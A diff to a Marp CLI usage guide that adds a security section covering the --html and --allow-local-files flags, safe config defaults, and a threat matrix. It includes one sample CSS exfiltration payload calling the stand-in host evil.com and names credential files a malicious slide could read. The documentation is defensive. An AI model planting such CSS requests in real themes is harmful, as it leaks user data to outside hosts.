@@ -19,6 +19,13 @@
   - [Batch Processing](#batch-processing)
 - [Configuration File](#configuration-file)
 - [Integration with marp-slide Skill](#integration-with-marp-slide-skill)
+- [Security](#security)
+  - [The --html Flag](#the---html-flag--primary-risk)
+  - [The --allow-local-files Flag](#the---allow-local-files-flag--filesystem-access)
+  - [Custom Themes](#custom-themes-as-attack-vector)
+  - [Safe Configuration](#safe-configuration)
+  - [Threat Matrix](#threat-matrix)
+  - [Recommendations](#recommendations)
 - [Troubleshooting](#troubleshooting)
 - [References](#references)
 
@@ -236,13 +243,15 @@ Create a `.marprc.yml` in the project root for default settings:
 
 ```yaml
 # .marprc.yml
-allowLocalFiles: true
+allowLocalFiles: false
 theme: ./assets/custom-theme.css
-html: true
+html: false
 pdf: false
 options:
   loggingLevel: warn
 ```
+
+> **Note:** `allowLocalFiles` and `html` are `false` by default for security reasons. Only enable them for trusted content — see the [Security](#security) section below.
 
 Supported configuration formats: `.marprc.yml`, `.marprc.yaml`, `.marprc.json`, `.marprc.js`, `marp.config.js`, `marp.config.mjs`.
 
@@ -280,6 +289,76 @@ marp presentation.md --pdf
 # 4. Or start a dev server for live presentation
 marp -s . --port 3000
 ```
+
+## Security
+
+Marp CLI is designed with security-first defaults. The two most dangerous flags — `--html` and `--allow-local-files` — are **disabled by default**. Understanding when and why to enable them is critical.
+
+### The `--html` Flag — Primary Risk
+
+By default, Marp **strips** raw HTML tags from Markdown files. The `--html` flag removes this protection.
+
+| Mode | Behavior | Risk |
+|:---|:---|:---|
+| Without `--html` (default) | HTML tags are ignored | Safe |
+| With `--html` | HTML is rendered as-is | XSS possible if the file is from an untrusted source |
+
+**Rule:** only enable `--html` for **your own** files. Never for files from third parties.
+
+### The `--allow-local-files` Flag — Filesystem Access
+
+By default, Marp CLI has **no access** to local files. This is intentional — the previous version of Marp (classic) [was exploited by attackers to steal local files](https://github.com/marp-team/marp-cli).
+
+| Mode | Behavior | Risk |
+|:---|:---|:---|
+| Without flag (default) | Local images do not load | Safe |
+| With `--allow-local-files` | Access to **any** file on disk | A malicious `.md` can read `/etc/passwd`, `~/.ssh/id_rsa`, etc. |
+
+**Rule:** use `--allow-local-files` only with **trusted** Markdown files. For untrusted files, upload images online or encode them as base64.
+
+### Custom Themes as Attack Vector
+
+A CSS theme can contain exfiltration payloads:
+
+```css
+/* Harmless */
+section { background: #fff; }
+
+/* Dangerous — data leak via external request */
+section::after {
+  content: url("https://evil.com/steal?data=...");
+}
+```
+
+**Rule:** only use your own themes or themes from verified sources. The 7 built-in themes in the `marp-slide` skill are safe — they are stored locally in `assets/`.
+
+### Safe Configuration
+
+Recommended `.marprc.yml` for projects that accept external contributions:
+
+```yaml
+# .marprc.yml — safe defaults
+allowLocalFiles: false   # disable local file access
+html: false              # disable raw HTML rendering
+```
+
+### Threat Matrix
+
+| Scenario | Threat Level | Mitigation |
+|:---|:---|:---|
+| Rendering **your own** file | Minimal | Safe to enable `--html` and `--allow-local-files` |
+| Rendering a file from a **colleague** | Medium | Review the `.md` before rendering, do not enable `--html` |
+| Rendering a file from the **internet** | High | No `--html`, no `--allow-local-files`, review CSS |
+| Sharing **HTML export** | Medium | HTML files can contain JS — prefer sharing PDF |
+| CI/CD pipeline | Medium | Docker isolation, fixed themes, no `--allow-local-files` |
+
+### Recommendations
+
+1. **For sharing** — export to PDF, not HTML. PDF does not execute JavaScript.
+2. **For presenting** — HTML in browser, but only your own files.
+3. **For CI/CD** — Docker container with fixed themes, no access flags.
+4. **Images** — upload to CDN/GitHub and use HTTPS URLs instead of `--allow-local-files`.
+5. **Do not trust** `.md` files from unverified PRs — review CSS and HTML blocks before rendering.
 
 ## Troubleshooting
 
